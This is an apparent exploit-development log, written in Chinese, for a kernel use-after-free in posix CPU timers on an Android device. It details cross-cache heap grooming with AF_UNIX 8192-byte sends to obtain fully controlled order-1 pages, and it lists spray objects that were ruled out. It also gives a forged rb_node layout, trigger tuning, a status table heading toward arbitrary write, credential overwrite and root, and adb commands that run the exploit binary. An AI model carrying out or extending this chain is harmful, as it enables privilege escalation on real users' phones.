# 147 — 整页可控重占找到解：AF_UNIX 8KB frag = order-1 全控页

日期：2026-10-17 21:50
设备：M610BB / 6.18.21-android17-5-g1d099fcb35e0 / 补丁级 2026-09-01

## 0. 一句话结论

**`send(AF_UNIX, buf, 8192)` 会在内核里得到一块 `order-1`（2 页 = 8192B）的页，页内偏移 0 起就是我们的 8192 字节，逐字节可控。**
这与 `posix_timers_cache`（384B × 21 对象 / order-1 slab，对象从页偏移 0 按 0x180 递进）**几何完全同构**，
因此 64560 的悬空 `rb_node` 可以被"整页伪造"覆盖，`__rb_parent_color / rb_right / rb_left / expires`
四个字段首次全部落到我们手里。这解决了此前两轮的硬缺口（`SO_ATTACH_FILTER` 只能控制 4/8 字节）。

## 1. 依据：本机 vmlinux 反汇编（不是猜测）

`alloc_skb_with_frags @ 0xffffffc080fd8c1c`，入口 `mov w22, w2` = `max_page_order`：

```
8cf0  add  x8, x20, #0xfff          ; x20 = data_len
8cf4  and  x26, x8, #~0xfff         ; x26 = round_up(data_len, PAGE_SIZE)
8cf8  lsl  x8, x27(=0x1000), x22    ; x8 = PAGE_SIZE << order
8cfc  cmp  x26, x8
8d00  b.lo 0x8d20                   ; round_up(data_len) < 该 order 的字节数 ⇒ 降阶重试
8d08  orr  w0, w24, w25             ; gfp |= __GFP_COMP
8d0c  mov  w1, w22                  ; order
8d18  bl   __alloc_pages_noprof
...
8d20  cmp  w22, #1
8d24  b.eq 0x8d64                   ; 已到 order 1 还放不下 ⇒ 不分 frag，退回线性 skb
8d28  sub  w22, w22, #1
8d2c  b    0x8cf8
```

调用方 `unix_stream_sendmsg @ 0xffffffc0811e55cc` 传 `max_page_order = 3`（`mov w5, #3`），
并把 `data_len` 算成 `size - round_up(size - 0xe80)`。于是：

| 发送长度 | data_len | 选中的 order | 结果 |
|---|---|---|---|
| 4096 | 0 | — | 全部走线性 skb |
| 5000 | 4096 | 无（8192 > 4096 且已到 order 1） | 线性 |
| **8192** | **8192** | **order 1** | **2 页，8KB 全控** ✓ |
| 12288 | 0 | — | 线性（kmalloc-16k） |

## 2. 为什么必须走 frag，而不是 kmalloc

`/proc/slabinfo` 实测：

```
kmalloc-8k    1060 1069  8192  4  8   ← 4 objects / 8 pages = order-3
kmalloc-4k   17514 17569 4096  8  8   ← order-3
posix_timers_cache  555 756 384 21 2  ← order-1
```

`kmalloc-*` 大对象 cache 的 slab 都是 **order-3（8 页）**，与目标的 order-1 **页阶不匹配**，
cross-cache 根本走不通；而 frag 页是 `alloc_pages(order=1)`，与目标**页阶一致**，且内容是用户数据。

## 3. 已排除的对象（本轮实测，均为硬失败）

| 尝试 | 结果 |
|---|---|
| `msgsnd`（SysV msg_msg） | **ENOSYS(38)**，内核未开 `CONFIG_SYSVIPC` |
| `mq_open`（POSIX mqueue，同为 `load_msg` 语义） | **ENOSYS(38)**，`CONFIG_POSIX_MQUEUE` 也未开 |
| `add_key("user",…)` | **EACCES(13)**，SELinux 不放行 |
| `setxattr` 256B | **E2BIG(7)**，f2fs 上不可用 |
| AF_UNIX 200B 报文 | 落 `kmalloc-1k`（skb 头开销把尺寸顶上去），页阶不符 |
| `SO_ATTACH_FILTER` len=32 | 落 `kmalloc-256`（order-1，几何对）但**每 8 字节只能控 4 字节**，低 4 字节恒为 `0x00000006` |

⇒ msg_msg 家族在 Android 17 上整体不可用；`SO_ATTACH_FILTER` 只能当 oracle，不能当写原语。

## 4. 由此得到的新伪造布局（v11 已实现）

`k_itimer`（384B）里只关心 `it.cpu.node @ +0xe0`：

```
node + 0x00  __rb_parent_color   ← rb_parent | color
node + 0x08  rb_right
node + 0x10  rb_left
node + 0x18  expires            ← 0 = 早已到期，保证被 collect_posix_cputimers 取走
```

伪造内容在 8KB 内按 `slot = k*0x180`（k = 0..20）铺满，**不管目标对象落在哪个槽位都覆盖到**。
oracle 取 `__rb_parent_color = 0xdeadbeefdead0000`、左右子树 NULL：
`collect → timerqueue_del → rb_erase_cached → __rb_change_child` 会先读 `parent->rb_left`，
**必然以 0xdeadbeefdead0000 为故障地址 panic**；其余字节填 0x41 作为页归属指纹。

## 5. 同时确认的触发器瓶颈

- v3 的 600 次 exec 才有 1 次 WARN ⇒ 单轮 1 次 exec 的 v9（1000 轮）期望命中只有 ~1.7 次，
  再乘抢页成功率几乎注定看不到 panic。v9 跑到 210/1000 后主动停掉。
- 改为 **v10/v11：每轮 8 个 victim 并发 exec**（各自 N 个父进程代建的 CPU 计时器），
  代价只是删除调用数，exec 密度 ×8。实测 2.0–2.1 s/轮（8×256 = 2048 计时器，删除全部成功）。

## 6. 当前状态

| 环节 | 状态 |
|---|---|
| 漏洞未回移（四标记） | ✅ |
| 零特权可达（实机 WARN，UID 2000） | ✅ |
| 6.18 结构偏移（BTF） | ✅ |
| 页回流（216 → 37 slab） | ✅ |
| **整页可控重占对象** | ✅ **AF_UNIX 8192 → order-1 全控页** |
| 触发密度 | ✅ 8 victim/轮，2.0 s/轮 |
| oracle 同轮命中（panic 含 0xdeadbeefdead0000） | ⏳ v11 900 轮运行中（PID 27659，`/data/local/tmp/v11.log`） |
| 任意写 → cred → ksud | ⏳ |

## 7. QEMU + KASAN 这条线：本机环境不可行（如实记录）

WSL 侧实测：`make / gcc / flex / bison / cpio / qemu-system-aarch64` **全部缺失**，
`sudo -n true` 要求交互式密码，apt 缓存里只有交叉编译器，没有上述工具。
⇒ 在用户授予安装权限（`sudo apt install build-essential flex bison libssl-dev libelf-dev qemu-system-arm cpio`）
之前，KASAN 内核这条路无法启动。当前不改主线，继续用设备侧 oracle。

## 8. 复现命令

```
adb push t64560_v11 /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/t64560_v11
adb shell "/data/local/tmp/t64560_v11 900 256 8 1200 400"
#                    轮数 timers victim wait_ms 每轮 frag 数
```
命中判据：`dmesg` 出现 `Unable to handle kernel paging request` 且故障地址含
`deadbeefdead0000`（或 `41414141...`），同时设备重启。
